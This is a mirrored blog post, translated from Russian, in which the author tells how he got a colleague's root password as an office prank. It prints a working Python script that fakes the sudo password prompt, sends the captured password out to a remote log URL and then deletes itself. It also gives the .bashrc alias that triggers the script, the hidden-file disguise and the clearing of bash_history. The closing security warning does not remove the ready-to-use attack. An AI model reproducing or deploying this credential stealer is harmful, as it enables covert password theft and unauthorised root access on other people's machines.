<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Linux - the story of one hacking</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello World! 
 Today I would like to share with you one instructive story about how once I managed to get root access to a work computer of a colleagu...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Linux - the story of one hacking</h1><div class="post__text post__text-html js-mediator-article"><img align="left" src="https://habrastorage.org/getpro/habr/post_images/841/7d0/e5f/8417d0e5f93226e84c806df146db5f72.jpg" alt="image">  Hello World! <br>  Today I would like to share with you one instructive story about how once I managed to get root access to a work computer of a colleague and how terribly easy it turned out to be. <br><a name="habracut"></a><br><h5>  Prehistory </h5><br>  The working day passed as it usually goes for any average developer: a monitor, keyboard, tea, cookies ... In general, nothing outstanding was, as always, expected.  Tired of the long-running debugging of an application in Xdebug, I decided to leave the office and get a little fresh air to get my head (by the time ‚Äúcast-iron‚Äù) in order. <br><br>  Returning to the workplace, I did not have time to start working, when suddenly from the next table came the malicious voice of my colleague: <br><br>  - Listen, it looks like your browser's process id is XXXX, right? 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Running the command ps -A |  grep opera, I saw that the pid is really the one that my colleague was talking about. <br><br>  - So what?  - I answered in a calm voice. <br>  - Nothing - said a colleague and pressed "Enter" on the keyboard of your computer.  My browser window closed in my eyes. <br><br>  I immediately began to look for processes in the system that the remote shell could give.  It was not ssh. <br>  A colleague hinted that it was nc (netcat), the process of which, of course, was immediately killed. <br>  We both laughed, discussed this funny incident, it turned out that there was in fact no hacking and that ‚Äúnc‚Äù was launched from under my user at that moment while I was not in the workplace.  Just for lulz. <br>  The joke, in general, was a success, but subconsciously I decided that it was impossible to leave this business so simply, it was a challenge! <br><br><h5>  Pulp </h5><br>  Once in the icy winter season, right before the New Year, I decided that it was time to take revenge.  But this time I wanted to completely grab access to the computer - get root. <br><br>  New Year's preparations in the office created a hefty bustle and noise.  It was the right moment, because a colleague after the incident began to block the screen when he was moving away from the workplace.  I knew that today is the day when the probability that he will forget to make a lock is as high as possible. <br><br>  Using a small ‚Äúwindow‚Äù in my working time, I began to think of an action plan for hacking.  The main problem that had to somehow be solved was of course directly obtaining the root account, since everything else is just a matter of technology.  Began an active search of ideas on how it can be done at all. <br><br>  A colleague was Linux Mint 14 "Nadia".  Kernel version - 3.5.  Although the kernel is not so old, the probability of quickly finding in a free access a working local exploit is close to zero.  Of the services, apart from Apache, he didn‚Äôt really have anything, and he closed Apache for external access. <br><br>  Leaving the idea behind the idea, it eventually dawned on me!  And what if you try the easiest and most banal bash alias? <br>  Having decided to check my guess, I run a terminal (Debian Squeeze), create a test.py file with the banal print ‚ÄúHello, world!‚Äù, Save it in my home directory, execute the command: <br><pre><code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">alias</span></span> sudo=<span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$HOME</span></span></span><span class="hljs-string">/temp.py"</span></span></code> </pre> <br>  after that I type: <br><pre> <code class="bash hljs">sudo mc</code> </pre> <br>  result: <br><pre> <code class="bash hljs">Hello, world!</code> </pre> <br>  Here it is!  Absolutely legal "hole" in security.  Trite, but effective. <br><br>  And now the script! <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python # ..      ,   PEP #        (   !) import os, sys, time, subprocess, getpass, urllib, base64 url = 'http://example.com/log.php?data=%s' user = getpass.getuser() #    sudo passwd = getpass.getpass("[sudo] password for %s: " % user) msg = user + ':' + passwd home = os.path.expanduser('~') script = sys.argv[0] #        with open(os.path.join(home, ".xsession-name"), "a+") as f: f.write(msg + "\n") #   -     gateway urllib.urlopen(url % base64.b64encode(msg)) #     -      bashrc with open(os.path.join(home, '.bashrc'), 'r+') as f: lines = f.readlines()[:-1] f.seek(0) f.writelines(lines) f.truncate() #       time.sleep(2) print "Sorry, try again" # !     sudo subprocess.call(['sudo'] + sys.argv[1:]) # ..    ,        os.system('pkill python &amp; rm %s' % script)</span></span></code> </pre><br><br>  In brief: the script imitates the sudo password request, intercepts the password and sends it to the specified server, where the information is simply written to a file. <br><br>  Taking advantage of the temporary absence of a colleague in the workplace, I moved to his computer and began my ‚Äúspecial operation‚Äù: <br><br>  1. Create a permanent alias in bashrc: <br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'alias sudo="'</span></span><span class="hljs-variable"><span class="hljs-variable">$HOME</span></span><span class="hljs-string"><span class="hljs-string">'/.xsession-lock"'</span></span> &gt;&gt; <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.bashrc</code> </pre> <br>  2. Create a file with a tricky name .xsession-lock, so as not to catch the eye when listing / home / user, and save our Python script to it. <br>  3. Set permissions to execute .xsession-lock - chmod + x <br>  4. Clean bash_history! <br><br>  The first thing after his return, a colleague, waiting for a trick, carefully examined the bash_history, and without noticing anything, began to work. <br>  After some time, I decided to check the log file on a remote server that saved the passwords, and here it is, the <s>fish</s> account of my dream - root! <br>  Of course, to be precise, in fact, this is a password from a working user of a colleague, which gave me the opportunity to get root and gain a foothold in the system. <br><br>  Later, I again waited for my colleague to leave the office and ‚Äúconjured‚Äù over his computer as root, but, unfortunately, I miscalculated the time and got pierced!  Alas, caught red-handed right on the site of "crime." <br><br>  We laughed again, discussed the details of the ‚Äúhacking‚Äù, and then celebrated the New Year in a friendly and fun way with the whole office. <br>  Here is such a New Year's Eve story. <br><br><h5>  Conclusion </h5><br>  In the light of the fact that Valve released steam under linux, there appeared a likelihood of hamsters' outflow towards Linux-systems and, at the same time, the likelihood that gentlemen from black hat will focus their eyes on Linux. <br><br>  Therefore, I would like this article to become another reminder that ‚Äúthe rescue of drowning people is the work of the drowning people themselves‚Äù. <br>  Installing Linux, do not think about what you wear "diapers".  Responsibility for the security of your information still lies with you! <br><br>  PS The method described above may well be applied in an automated form, for example, when creating bot networks.  According to this principle, it is possible to create a bootloader that will lie and wait meekly for the user to enter the password, be it sudo, or gksudo, and after that will turn the computer into a ‚Äúzombie machine‚Äù. <br>  In addition, popular distributions come with exactly these default settings, which allow you to crank the method from this article. <br>  I hope that in the near future in the world of security * nix systems, nothing will change and some Lin'lokers and other nonsense will not start to appear. <br><br>  PPS Hi <a href="https://habrahabr.ru/users/yanovsky/" class="user_link">Yanovsky</a> ! </div><p>Source: <a href="https://habr.com/ru/post/200912/">https://habr.com/ru/post/200912/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../200902/index.html">Importing OpenStreetMap to MySQL</a></li>
<li><a href="../200904/index.html">Anatoly Wasserman approves Clouds</a></li>
<li><a href="../200906/index.html">How Groupon migrated from monolithic Rails applications to the new Node.js infrastructure</a></li>
<li><a href="../200908/index.html">Drupal 7. DIY subscription module</a></li>
<li><a href="../200910/index.html">Algorithm and advantages of CMS automatic update</a></li>
<li><a href="../200914/index.html">We decode GSM with RTL-SDR for $ 30</a></li>
<li><a href="../200916/index.html">Ajax file uploads using jQuery and CodeIgniter</a></li>
<li><a href="../200918/index.html">A simple way to assess the importance of search queries for the site</a></li>
<li><a href="../200920/index.html">Email marketing: 3 relevance lessons from the best companies</a></li>
<li><a href="../200922/index.html">SSD screw is turned off after 5 minutes of operation Or inconceivable SSD controller logic</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>